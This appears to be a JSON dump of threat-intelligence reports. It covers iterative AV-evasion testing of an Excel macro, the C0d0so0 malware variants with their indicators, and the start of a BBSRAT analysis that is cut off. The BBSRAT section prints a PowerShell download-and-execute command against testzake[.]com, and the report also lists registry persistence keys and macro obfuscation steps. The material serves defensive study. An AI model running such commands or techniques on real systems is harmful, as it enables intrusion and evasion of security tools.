            "type": "caption",
            "content": [
                "Figure 10 Screenshot of diff between files related to Iteration 5 showing removal the call to the Shell function"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester reintroduces the call to the built-in Shell function that they removed in the prior iteration.",
                "However, the tester did not include the command to run by omitting the string to run the AppPool.vbs script using wscript.",
                "Figure 11 shows that the call to the Shell function has a blank command parameter.",
                "The detection rate increased considerably, which suggests that the detection rate was not based on the command itself, rather detection stemmed on the generic call to the built-in Shell function."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 11 Screenshot of diff between files related to Iteration 6 showing the use of an empty command in the Shell function"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester reintroduces the command to run the AppPool.vbs script using wscript to the call to the built-in Shell function, as seen in Figure 12.",
                "However, this time the tester uses the vbNormalFocus flag instead of the vbHide flag, which runs the command in a visible command prompt window.",
                "This change lowers the detection rate by 8, which suggests that the use of the vbHide flag within the Shell function was considered malicious by several vendors."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 12 Screenshot of diff between files related to Iteration 7 showing use of a visible window when running command"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This iteration of testing was performed well after the previous iteration with the newly generated file being created almost 5 days after its predecessor.",
                "This large delta in file creation times could suggest a new round of testing activities; however, the filename for this newly generated file is sss - Copy.xls while the previous file was named sss.xls.",
                "Comparing these two filenames suggests that the tester may have copied the file generated in the previous iteration to use as a basis for this current iteration of testing.",
                "Due to the filenames and the changes made to the macros in these two documents, we are treating this activity as part of the ongoing testing efforts."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In this iteration, the tester made a few changes to multiple portions of the macro.",
                "First, the tester removed the line of code that would have the macro sleep for 10 seconds, which was first introduced in iteration 3. Figure 13 shows the removal of this line of code, which uses the Application.",
                "Wait function to sleep for 10 seconds."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 13 Screenshot of diff between files related to Iteration 8 showing removal of the sleep functionality"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The next modification made by the tester involved obfuscating the string wscript  within the command run within the Shell function.",
                "The tester uses the same string obfuscation technique used in previous iterations by replacing the string with each character in hexadecimal form concatenated together.",
                "Figure 14 shows the obfuscated string Chr(CLng(\"&H77\")) & Chr(CLng(\"&H73\")) & Chr(CLng(\"&H63\")) & Chr(CLng(\"&H72\")) & Chr(CLng(\"&H69\")) & Chr(CLng(\"&H70\")) & Chr(CLng(\"&H74\")) & Chr(CLng(\"&H20\")) used to represent wscript ."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 14 also shows the tester changed the variable name used to store the ActiveSheet object that represents the current Excel worksheet.",
                "The tester changed this variable name from sh to Sh (line 41), which the tester also changed in each preceding line (lines 43, 45 and 47) when using the object."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 14 Screenshot of diff between files related to Iteration 8 showing use of string obfuscation on command and modified variable name"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Iteration 9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the last iteration of testing, the tester removes the entire line of code used to call the Shell function used to call the AppPool.vbs script that included the obfuscated wscript string.",
                "Figure 15 shows that the tester merely removed the entire line and did not replace it with any code, which suggests that the macro would never run the VBScript file that it saves to the system."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 15 Screenshot of diff between files related to Iteration 9 showing removal of the Shell command"
            ]
        }
    ],
    "0eb2432829688ab02df01061e7bece5960169b09": [
        {
            "type": "paragraph",
            "content": [
                "While recently researching unknown malware and attack campaigns using the AutoFocus threat intelligence platform, Unit 42 discovered new activity that appears related to an adversary group previously called C0d0so0 or Codoso.",
                "This group is well known for a widely publicized attack involving the compromise of Forbes.com, in which the site was used to compromise selected targets via a watering hole to a zero-day Adobe Flash exploit.",
                "Compared to other adversary groups, C0d0so0 has shown the use of more sophisticated tactics and tools and has been linked to leveraging zero-day exploits on numerous occasions in combination with watering hole and spear phishing attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the newly discovered attack campaign, Unit 42 identified attacks targeting organizations within the telecommunications, high tech, education, manufacturing, and legal services industries.",
                "The attacks likely were initially delivered via spear-phishing e-mails, or as demonstrated by C0d0so0 in the past, legitimate websites that had been previously compromised then used as watering holes for the selected victims."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In such situations, the victims would then be redirected to another set of compromised websites.",
                "These websites hosted malware that would be side-loaded with a legitimate signed executable.",
                "These tactics are becoming increasingly common by malware authors in order to evade security products and controls.",
                "Two variants of the malware employed by C0d0so0 were discoveredone that used HTTP for command and control (C2) communications, and one that used a custom network protocol over port 22."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In these newly discoveredC0d0so0 attacks, several of the targeted hosts were identified as server systems, instead of user endpoints, suggesting the possibility that these specific targets will be used in future attacks as additional watering holes.",
                "Both of the malware variants encoded and compressed the underlying network traffic to bypass any network-based security controls that were implemented."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware variants in question do not appear to belong to any known malware family, although the structure of the network communication does bear a resemblance to the Derusbi malware family, which has shown to be unique to Chinese cyber espionage operators.",
                "Past observations of Derusbi in various attack campaigns indicate the version used was compiled specifically for that campaign.",
                "Derusbi has had both the client and server variants deployed, using different combinations of configurations and modules.",
                "The newly discovered activity is consistent with this procedure, with compile times only a few days prior to the observed attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1: Attacker infrastructure\n(Click to view full size.)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following primary C2 servers for the malware variants were identified:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The jbossas and supermanbox domains were found to resolve to the same Hong Kong based IP address, 121.54.168.230.",
                "A total of three unique samples were identified communicating with these two domains using the raw network protocol communicating over port 22.",
                "They used what appeared to be three separate legitimate websites that looked to be compromised for malware distribution."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The microsoft-cache domain was used by the malware variant that communicated over HTTP.",
                "We found four unique samples communicating with this domain, which resolved to the same Hong Kong-based IP address used by the first two domains."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This variant was disguised as a serial number generator for the popular AVG anti-virus product.",
                "When executed, the binary will drop and run the serial generator for AVG."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2: AVG serial generator"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It will also drop the following two files:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "% LOCALAPPDATA %\\dbgeng.dll\n% LOCALAPPDATA %\\fakerx86.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The dropped DLL in question is sideloaded with the legitimate fakerx86.exe executable, which is the symbolic debugger for Microsoft Windows."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Upon loading the malicious DLL, a number of encrypted blobs are decrypted using single-byte XOR keys.",
                "Strings are separated by five bytes of junk data, which is consistent across all samples witnessed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3: Decrypted strings"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following IDAPython script can be used to both decrypt and parse these encrypted blobs:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After various data is decrypted, the malware will ensure that it is not running within the context of the rundll32.exe executable.",
                "This simple check acts as a simple anti-reversing mechanism, and ensures it is not running in either an analyst environment or a sandbox."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It continues to ensure persistent execution by setting the following registry key:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools \u2013 %LOCALAPPDATA%\\fakerx86.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware variant continues to spawn new threads that are responsible for network communication and other malicious activities.",
                "It then gathers information about the victim machine, including the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This information will eventually be exfiltrated via a HTTP POST request, as seen below.",
                "The data sent is base64-encoded."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4: Malware exfiltrating victim information"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All network communication for this malware variant takes places over HTTP.",
                "The server will respond with data similar to the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5: C2 server response"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware will parse the background-color parameter in the C2 response to determine what offset it will read.",
                "In the above example, the 028300 is converted to an integer and divided by 100 to produce a result of 283.",
                "The malware proceeds to read in data at offset 283.",
                "The first four bytes of this data represent the total length.",
                "The remaining data is base64-decoded and parsed.",
                "This base64-decoded data has the following data structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6: Network data structure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The server will respond with a DLL file that has the following exports:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When loaded, this DLL attempts to download further plugins from the remote server.",
                "At the time of analysis, no plugins were available as the command and control server was no longer active."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This variant, which appears to be more recent than the HTTP variant, is delivered via the filename of McAltLib.dll and is configured to be side-loaded with the legitimate McAfee mcs.exe executable."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7: Malware side-loaded with mcs.exe executable"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When initially loaded, the malware will register itself as a service with the following parameters:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Service Name: Dncp\nDisplay Name: Dncp Client\nBinary Path: %SystemRoot%\\System32\\svchost.exe -k netsvcs\nStartup Type: SERVICE_AUTO_START\nAccount: LocalSystem"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following registry keys are set or modified:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\\netsvcs :",
                "Appends \u2018Dncp\u2019"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dncp\\Description: \u201cRegisters and updates IP addresses and DNS records for this computer.",
                "If this service is stopped, this computer will not receive dynamic IP addresses and DNS updates.",
                "If this service is disabled, any services that explicitly depend on it will fail to start\u201d"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Dncp\\Parameters\\ServiceDll : Path to McAltLib.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These modifications configure the McAltLib.dll to execute in the context of a service and to be run automatically when the machine is rebooted.",
                "When the malware is initially executed, it will open and start the Dncp service after the service is created.",
                "When run in the context of a service, the malware will spawn two threads."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Throughout execution of this variant, it will call a function responsible for decrypting subsequent instructions.",
                "After the instructions have completed executing, another function is called that will re-obfuscate the previously executed instructions.",
                "This acts as an anti-reversing technique by the author."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8: Anti-reversing technique used by the malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One of the threads is responsible for deleting the original McAfee mcs.exe executable.",
                "It will enter a loop attempting to delete the mcs.exe executable that is located in the same directory as McAltLib.dll."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The other thread is responsible for collecting victim information, communicating with a remote host, and downloading/loading further malware.",
                "It begins by generating and parsing a configuration string.",
                "The following configuration string is used in this particular instance of the malware:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "/s",
                "www.supermanbox[.]org /p 22 /st 60 /rt 60"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above example, the first parameter is the remote hostname and the second parameter is the port over which communication occurs.",
                "The remaining parameters are most likely used as sleep timers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It proceeds to collect the following information from the victim:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This information is exfiltrated in a newly spawned thread with a randomly chosen delay timer of 1-3 minutes in between attempts."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware then proceeds to send an initial beacon to the hostname/port that is configured within the binary.",
                "This data contains victim information that was previously collected and the server responds with an acknowledgement.",
                "The malware proceeds to send a packet containing the victims MAC address.",
                "These packets have the following structure:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above example, only the first byte of the XOR key (0x84) is used for decryption.",
                "After the data is decrypted using this single-byte XOR key, it will then be decompressed using the LZO algorithm.",
                "The data represented above becomes the following after decryption and decompression takes place:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "00000000: 2D 30 30 30 30 30 31 39 32 36 36 38 39 37 39 32 -000001926689792"
            ]
        },
        {
            "type": "caption",
            "content": [
                "00000010: 36 00 00\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 6.."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This string is generated via the MAC address of the victim machine.",
                "The MAC address is converted from its original hexadecimal representation to an integer and formatted via a call to printf.",
                "It is most likely used as a unique identifier for the victim.",
                "Finally, the malware sends a similar request, only with a packet type of 00 07 02 00.",
                "The server responds with a DLL file that has the following exports:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When loaded, this DLL attempts to download further plugins from the remote server.",
                "At the time of analysis, no plugins were available as the command and control server was no longer active."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When Forbes.com was compromised in November 2014, victims were infected with malware that loaded a file named wuservice.dll.",
                "Reverse-engineering this file indicates that the McAltLib.dll file identified in this attack is most likely a newer variant of the malware found in the forbes.com attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Of particular note, both samples use a single-byte XOR obfuscation routine where a large buffer is decrypted.",
                "Strings are separated by five bytes of garbage, as seen below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 9: Comparison of string encryption between samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As seen in the above screenshot, there is a large overlap in unique strings in both samples.",
                "The original sample involved in the forbes.com breach used HTTP, which is consistent with the original variant discussed in this blog post.",
                "It should be noted that while the newest variant that uses direct network communication over port 22 no longer uses HTTP, references to the HTTP strings are still found within the sample itself.",
                "This is most likely due to code re-used by the attackers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Overall capabilities between the forbes.com sample and the newest variants discussed are consistent.",
                "All samples execute the same overall capabilities, gathering and uploading victim information and attempting to download a secondary DLL then calling that DLLs StartWorker exported function."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The tactics, techniques, and procedures (TTPs) used by C0d0so0 appear to be more sophisticated than many other adversary groups with multiple layers of obfuscation in use, as well as specific victim targeting in what appears to be an attempt at creating a staging area for additional attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 will continue observation and research on this groups activity, as it appears this may be the beginning of the campaign.",
                "At this time, the following protections are in place for Palo Alto Networks customers:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: CD8C2BB644496D46BF1E91AD8A8F882B\nSHA1: CC6EBEEA48A12B396C5FA797E595A0C3B96942DE\nSHA256: 3EA6B2B51050FE7C07E2CF9FA232DE6A602AA5EFF66A2E997B25785F7CF50DAA\nSize: 137728 Bytes\nFile Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nCompile Time: 2015-11-18 15:03:50\nC2: www.supermanbox[.]org:22"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: 26E863F917DA0B3F7A48304EB6D1B1D3\nSHA1: F7984427093BA1FC08412F8594944CEFE2D86CBF\nSHA256: 3577845D71AE995762D4A8F43B21ADA49D809F95C127B770AFF00AE0B64264A3\nSize: 138752 Bytes\nFile Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nCompile Time: 2015-11-19 16:57:29\nC2: www.jbossas[.]org:22"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: B06A3A9744E9D4C059422E7AD729EF90\nSHA1: 9BA2249F0A8108503820E2D9C8CBFF941089CB2D\nSHA256: EA67D76E9D2E9CE3A8E5F80FF9BE8F17B2CD5B1212153FDF36833497D9C060C0\nSize: 136704 Bytes\nFile Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nCompile Time: 2015-11-16 16:21:22\nC2: supermanbox[.]org:22"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: 1CB673679F37B6A3F482BB59B52423AB\nSHA1: B630B7A8FE065E1A6F51EE74869B3938DC411126\nSHA256: B690394540CAB9B7F8CC6C98FD95B4522B84D1A5203B19C4974B58829889DA4C\nSize: 126976 Bytes\nFile Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nCompile Time: 2015-07-15 09:38:15\nC2: www.microsoft-cache[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: 39A95C4CBF28EAA534C8F4FC311FE558\nSHA1: F6AEE373F2517F2FB686284C27A84A20999A15A5\nSHA256: CCF87057A4AB02E53BFF5828D779A6E704B040AEF863F66E8F571638D7D50CD2\nSize: 1973747 Bytes\nFile Type: PE32 executable (GUI) Intel 80386, for MS Windows\nCompile Time: 2013-06-21 06:26:37\nC2: www.microsoft-cache[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: 8AFECC8E61FE3805FDD41D4591710976\nSHA1: 615B022A56E2473B92C22EFA9198A2210F21BDC3\nSHA256: DE33DFCE8143F9F929ABDA910632F7536FFA809603EC027A4193D5E57880B292\nSize: 126980 Bytes\nFile Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nCompile Time: 2015-07-15 09:38:15\nC2: www.microsoft-cache[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MD5: 2161C859B21C1B4B430774DF0837DA9D\nSHA1: 380FB5278907FAF3FCA61910F7ED9394B2337EDA\nSHA256: DE984EDA2DC962FDE75093D876EC3FE525119DE841A96D90DC032BFB993DBDAC\nSize: 117248 Bytes\nFile Type: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nCompile Time: 2015-07-08 13:18:55\nC2: www.microsoft-cache[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3ea6b2b51050fe7c07e2cf9fa232de6a602aa5eff66a2e997b25785f7cf50daa\n3577845d71ae995762d4a8f43b21ada49d809f95c127b770aff00ae0b64264a3\nea67d76e9d2e9ce3a8e5f80ff9be8f17b2cd5b1212153fdf36833497d9c060c0\nde33dfce8143f9f929abda910632f7536ffa809603ec027a4193d5e57880b292\nb690394540cab9b7f8cc6c98fd95b4522b84d1a5203b19c4974b58829889da4c\nde984eda2dc962fde75093d876ec3fe525119de841a96d90dc032bfb993dbdac\nccf87057a4ab02e53bff5828d779a6e704b040aef863f66e8f571638d7d50cd2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "www.jbossas[.]org\nsupermanbox[.]org\nwww.supermanbox[.]org\nwww.microsoft-cache[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "121.54.168.230\n218.54.139.20\n210.181.184.64\n42.200.18.194"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "218.54.139.20/example/McAltLib.dll\n210.181.184.64/example/McAltLib.dll\n42.200.18.194/example/McAltLib.dll"
            ]
        }
    ],
    "af1d30a25ba0978e23369956d69285fc56a2f8be": [
        {
            "type": "paragraph",
            "content": [
                "In late 2014, ESET presented an attack campaign that had been observed over a period of time targeting Russia and other Russian speaking nations, dubbed Roaming Tiger.",
                "The attack was found to heavily rely on RTF exploits and at the time, thought to make use of the PlugX malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and general information stealing.",
                "Based on data collected from Palo Alto Networks AutoFocus threat intelligence, we discovered continued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a concentration of attacks in late October and continuing into December."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and attack vectors.",
                "However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a completely new tool with its own specific behavior patterns and architecture.",
                "We have named this tool BBSRAT."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As described in earlier reports on Roaming Tiger, the attack observed in August 2015 used weaponized exploit documents that leave Russian language decoy document files after infecting the system.",
                "The files exploit the well-known Microsoft Office vulnerability, CVE-2012-0158, to execute malicious code in order to take control of the targeted systems."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 Spear-phishing email delivering BBSRAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In one case, the adversary impersonated an individual from the organization Vigstar, a Russian-based research organization in charge of the development of satellite communications and special purpose wireless devices for the Russian Federations defense and security agencies.",
                "The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was found on a job board website for a job opening at Vigstar."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The rough translation of the body of the email is as follows:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "I send you a \"list of international exhibitions of military, civil and dual-purpose, conducted in 2015 on the territory of the Russian Federation and foreign states.\"",
                "Waiting for your reply!"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international exhibitions that were conducted on Russian territory in 2015."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2 Decoy document that is opened after the malicious document has infected the system"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In more recent months, we have identified several other potential Russian victims using AutoFocus.",
                "Analysis of the command and control (C2) infrastructure shows that the newly discovered samples of BBSRAT used the same C2 domains as previously published in the Roaming Tiger campaign, including transactiona[.]com and futuresgold[.]com.",
                "Interestingly, all of the previously published C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all.",
                "This may indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose-built variants and/or infrastructure for each of the intended targets."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3 Command and control infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was discovered to contain BBSRAT.",
                "When the dropper first runs, it will generate a path in the %TEMP% directory.",
                "The generated filename is 10-16 uppercase alphabetic characters, and ends with a .TMP file extension.",
                "The dropper will continue to write an embedded cab file in this location."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4 Header of CAB file dropped by BBSRAT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on the target machine:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using the built-in expand.exe utility provided by Microsoft Windows, the dropper executes the following command, which will expand the CAB file and write the results to the provided directory:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "expand.exe \"%TEMP%\\[temp_file]\" Destination \"[chosen_path]\\SSONSVR\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This results in the following three files being written to the SSONSVR directory:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The 'ssonsvr.exe' file is a legitimate Citrix executable that will be used to sideload the malicious pnipcn.dll file.",
                "The aclmain.sdb file contains code that will eventually be loaded by the pnipcn.dll file."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware finally executes ssonsvr.exe via a call to ShellExecuteW."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5 Execution flow of dropper expanding CAB file"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When ssonsvr.exe is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding the following environment string:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%SystemRoot%\\System32\\msiexec.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It will then spawn a suspended instance of msiexec.exe in a new process.",
                "The malware proceeds to load code from the aclmain.sdb file and performs process hollowing against this instance of msiexec.exe prior to resuming the process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6 Sideloading execution flow"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In order to ensure persistence, the following registry key is written on the victims machine:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe : [path_to_ssonsvr.exe]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the Invoke-ReflectivePEInjection.ps1 script from the PowerSploit framework."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the downloader executes, it will first decrypt the following two strings using a 5-byte XOR key of \\x01\\x02\\x03\\x04\\x05:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "\"powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke-ReflectivePEInjection -PEUrl http://testzake[.]com/s.exe\""
            ]
        },
        {
            "type": "caption",
            "content": [
                "\"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke-ReflectivePEInjection -PEUrl http://testzake[.]com/s.exe\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These strings are then sequentially executed via calls to WinExec.",
                "As we can see, the second command is specifically crafted to run on 64-bit versions of Microsoft Windows.",
                "The commands in question will download an executable file and run it within the context of the powershell process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the above commands are executed, the downloader will initially download the IR.ps1 powershell script from the specified URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 7 Downloader downloading the Invoke-ReflectivePEInjection PowerSploit script"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made.",
                "The malware then invokes this script with a URL that points to an additional executable file.",
                "This downloaded executable contains a copy of the BBSRAT malware family."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The downloader proceeds to drop either a 32-bit or 64-bit DLL file that will execute the two previously stated Powershell commands when the DLL is loaded.",
                "This DLL is dropped to one of the following locations:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%SYSTEMROOT%\\web\\srvcl32.dll"
            ]
        },
        {
            "type": "caption",
            "content": [
                "%APPDATA%\\web\\srvcl32.dll"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the following registry keys are set depending on the systems CPU architecture:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32\\ThreadingModel - \"Both\"\nHKU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32\\Default - [path_to_srvcl32.dll]"
            ]
        },
        {
            "type": "caption",
            "content": [
                "HKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\InprocServer32\\ThreadingModel - \"Both\"\nHKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}\\InprocServer32\\Default - [path_to_srvcl32.dll]"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The COM object for {42aedc87-2188-41fd-b9a3-0c966feabec1} is specific to MruPidlList, while the COM object for {F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1} is specific to Microsoft WBEM New Event Subsystem.",
                "This ensures that the DLL specified will load when Microsoft Windows starts.",
                "It is a technique that was used by the ZeroAccess rootkit when it initially surfaced."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following libraries at runtime:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following mutex is then created to ensure a single instance of BBSRAT is running at a given time:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Global\\GlobalAcProtectMutex"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Throughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below demonstrating BBSRAT making a call to the WSAStartup function:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 8 BBSRAT calling WSAStartup function"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware proceeds to parse the stored embedded network configuration and spawns a series of threads responsible for network communication.",
                "This includes a series of HTTP or HTTPS requests, such as the following:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "GET /bbs/1/forum.php?sid=1 HTTP/1.1\nCookie: A46A8AA9-D7D6-43FB-959DC96E\nContent-Length:\nUser-Agent: Mozilla/4.0 (compatible; Windows NT 5.1)\nConnection: Keep-Alive\nHost: transactiona[.]com\nCache-Control: no-cache\nAccept: */*\nContent-Type:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the above example, the 1 used both in the URI and the sid GET parameter is a global incremental counter.",
                "Every subsequent request made by BBSRAT increments this counter by one.",
                "Additionally, all variants of BBSRAT we have found use the same URL for command and control (C2) communication."
            ]
        },
        {
            "type": "paragraph",
            "content": [
